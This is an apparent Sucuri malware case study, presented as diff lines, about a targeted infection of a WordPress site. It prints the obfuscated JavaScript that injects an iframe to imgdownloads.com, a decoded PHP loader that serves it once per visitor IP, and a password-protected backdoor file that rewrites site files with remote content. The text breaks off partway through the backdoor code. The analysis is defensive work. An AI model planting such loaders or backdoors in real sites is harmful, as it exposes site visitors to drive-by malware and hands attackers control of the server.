@@ -1,0 +1,37 @@
+Targeted web-based malware – Case study
+
+We deal with web-based malware every day here at Sucuri. Most of them are very simple and easy to detect, but once in a while we face some that are very complex and targeted. This case study is about the later, a targeted attack against a high profile site. Hope you like it.
+A few weeks ago a client reported that his site was being flagged as having malware by an anti virus product. He wasn’t able to see it and even the users who complained to him about it, said that they only got the warning once and never more, so they weren’t sure if it was a false positive or not.
+We did a little analysis and only one Anti Virus (Avast) flagged the file http://site.com/wp-content/plugins/featured-content-gallery/scripts/mootools.v1.11.js as having malware. We re-run the scanner again and it said the file was clean. Weird…
+We manually looked at this mootools.v1.11.js and it looked clean to us. Time for a more complete investigation.
+Discovering the problem
+We went to our analysis system and we noticed that for the first time you visit the file http://site.com/wp-content/plugins/featured-content-gallery/scripts/mootools.v1.11.js it would return malware on the top of it. After that, the file would return clean.
+This is what was added to the top of the file:
+
+if(document.cookie.indexOf('urchin')==-1 && !window.navigator.userAgent.toLowerCase().match(/(indexer|googlebot|msnbot|bing|ask)/)) { res=new Date();res.setTime(res.getTime()+80000000);document.cookie='urchin='+escape('google-analytics.com')+';expires='+res.toGMTString()+';path=/';function mOG(){};var tO=40844;mOG.prototype = {i : function() {var v='';var iA=function(){return 'iA'};return 'h6tMt6pT:M/T../QiMmEgTdToTwMnElTo6aTdMsQ.Qc6oMmM/6iMnQ.McQgTiM?M4T'.iO(/[TEQM6]/g, '');var vL=function()..dK='dK';}zM=41990;var wE=function(){};var xW=57051;}};this.sA='';var rK=new mOG(); var tQ='tQ';rK.t();var cE=new Array();}
+
+This is this script a little more organized:So basically this malware will only be displayed if the user agent is not from a crawler (probably to avoid that the site get blacklisted or that it shows up on the search results).
+After all the obfuscation this is what it does:
+
+CreateElement iframe setAttribute src = http://imgdownloads.com/in.cgi?4
+
+So it creates a new iframe that points to imgdownloads.com (a site that is already blacklisted).
+Internal analysis – What is happening
+After we discovered what the malware was doing, we went to analyze his files to see what was happening.
+First, we discovered a directory at /www.site.com.com/web/cgi-bin/mt-bak/ with a list of IP addresses that were accessing the site each day.
+ls -la /www.site.com.com/web/cgi-bin/mt-bak/100405.txt100404.txt100403.txt..cat /www.site.com.com/web/cgi-bin/mt-bak/100405.txtx.78.231.202x.64.183.67x.14.192.1x.166.39.66x.158.1.162x.145.64.64x.218.178.206x.141.14.3x.1.84.124..
+Interesting, so that’s probably how it was tracking the IP addresses and deciding when to show the malware.
+We also, discovered an encoded PHP file (xml.php) with the following code:
+
+< ?php $v1 = strrev('edoced_46esab');$v2 = strrev('etalfnizg'); eval($v2($v1('nVdZk6JYFn7O/BUZFRWRWVFTKYuUSXTkzKgIgorKKvRMVMAFUbkslWAKdPR../n8OiaVZV98M8GHK3c76zfffc29uPnpP7d8939d/DhzLyPnz67fZjtoWp+14U573ceQn8nKB79../9ZNjjPws2abOPn5ESdQ7+W4PJXHuw6FT+uX8meJjsI
+
+Decoding the file, this is what it does:
+
+$date = date("ymd");$sf = '/www.site.com/web/content/wp-content/plugins/featured-content-gallery/scripts/mootools.v1.11.js';$mrd = trim(file_get_contents($sf));$cpasswd=@$_COOKIE['urchins'];$logfile= "/www.site.com/web/cgi-bin/mt-bak/$date.txt";$add = base64_decode('aWYo5tYXR8Y3Jhd2xlcnx5YWhvb3xzZWFyY2h8c3RhY2tyYW1ibGVyfGFwb..');$ip1 = $_SERVER['REMOTE_ADDR'];$lo = file($logfile);$skip = false;foreach($lo as $ip2){ if(trim($ip2) == $ip1) {  $skip = true;  break;  }}if ($skip == false){ $fp = fopen($logfile, "a"); fwrite($fp, "$ip1n"); fclose($fp); //$mrd .= "n".$add; echo $add."n".$mrd;}else { echo $mrd; }
+
+BINGO! That’s the file that is being called to decide when to show the malware. It reads the user IP address and if is not presence in the mt-bak directory, it shows the malware and adds it in there.
+Once we knew what was happening, it was easy to isolate which file was calling the xml.php to fix the problem. We didn’t have logs to know when this happened, but we had to find out how they got in to make sure it didn’t happen again.
+We took their web directory to see if we could find anything else there and also looked at the differences between a clean install of WordPress and theirs.
+By doing that, we found a new file hidden inside the wp-includes directory: class-rss.php:
+
+$p = "r3^wl8rch5w";$cont = "";if(isset($_POST['pass']) && @base64_decode($_POST['pass']) == $p){ if(isset($_POST['check']) && isset($_POST['file'])){  $_POST['file'] = rawurldecode($_POST['file']);  if(file_exists($_POST['file']) && is_writable($_POST['file'])){   die("2");  }else{   die("1");  } } if(isset($_POST['text']) && isset($_POST['file']) && file_exists($_POST['file']) && is_writable($_POST['file'])){  $_POST['file'] = rawurldecode($_POST['file']);  $_POST['text'] = rawurldecode($_POST['text']);  $ttx = @file_get_contents($_POST['text']);  if(strlen($ttx)==0){   die("3");  }  $cont = @file_get_contents($_POST['file']);  if(strlen($cont)==0){   die("4");  }  if(!isset($_POST['inraw'])){   if(preg_match("#
